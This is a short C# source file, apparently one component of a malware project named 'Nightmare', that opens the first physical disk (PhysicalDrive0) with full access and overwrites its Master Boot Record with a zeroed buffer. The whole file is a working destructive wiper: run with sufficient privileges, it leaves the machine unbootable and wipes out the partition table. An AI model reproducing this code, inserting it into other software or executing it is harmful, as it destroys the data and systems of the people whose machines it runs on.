using System;

namespace Nightmare
{
    public class Mbr // Master Boot Record
    {
        public static void MbrStart()
        {
            var mbrData = new byte[DLLImport.MbrSize];
            var mbr = DLLImport.CreateFile("\\\\.\\PhysicalDrive0", DLLImport.GenericAll, DLLImport.FileShareRead | DLLImport.FileShareWrite,
                IntPtr.Zero, DLLImport.OpenExisting, 0, IntPtr.Zero);
            DLLImport.WriteFile(mbr, mbrData, DLLImport.MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }
    }
}